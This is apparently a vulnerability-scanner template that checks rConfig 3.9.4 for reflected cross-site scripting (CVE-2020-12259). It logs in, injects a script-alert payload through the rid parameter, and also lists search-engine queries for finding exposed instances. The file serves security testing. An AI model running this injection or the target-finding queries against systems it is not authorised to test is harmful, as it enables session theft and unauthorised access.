http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code_3 == 200
    - contains(body_3, "<script>alert(document.domain)</script>") && contains(body_3,
      "rConfig - Configuration Management")
    - contains(content_type_3, "text/html")
    type: dsl
  raw:
  - 'GET /login.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /lib/crud/userprocess.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user={{username}}&pass={{password}}&sublogin=1

    '
  - 'GET /configDevice.php?rid="><script>alert(document.domain)</script> HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2020-12259
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:rconfig:rconfig:3.9.4:*:*:*:*:*:*:*
    cve-id: CVE-2020-12259
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.98533
    epss-score: 0.68306
  description: 'rConfig 3.9.4 is vulnerable to reflected XSS. The configDevice.php
    file improperly validates user input. An attacker can exploit this vulnerability
    by crafting arbitrary JavaScript in the rid GET parameter of devicemgmnt.php

    '
  impact: 'Authenticated attackers can inject malicious JavaScript through the rid
    parameter, potentially stealing session cookies or performing administrative actions
    on behalf of authenticated users.

    '
  metadata:
    fofa-query: title="rconfig"
    google-query: intitle:"rconfig"
    max-request: 3
    product: rconfig
    shodan-query:
    - http.title:"rConfig"
    - http.title:"rconfig"
    vendor: rconfig
    verified: 'true'
  name: rConfig 3.9.4 - Cross-Site Scripting
  reference:
  - https://www.rconfig.com/downloads/rconfig-3.9.4.zip
  - https://gist.github.com/farid007/8855031bad0e497264e4879efb5bc9f8
  - https://nvd.nist.gov/vuln/detail/CVE-2020-12259
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/Elsfa7-110/kenzer-templates
  remediation: 'Upgrade to rConfig version 3.9.7 or later.

    '
  severity: medium
  tags: cve2020,cve,rconfig,authenticated,xss,vuln
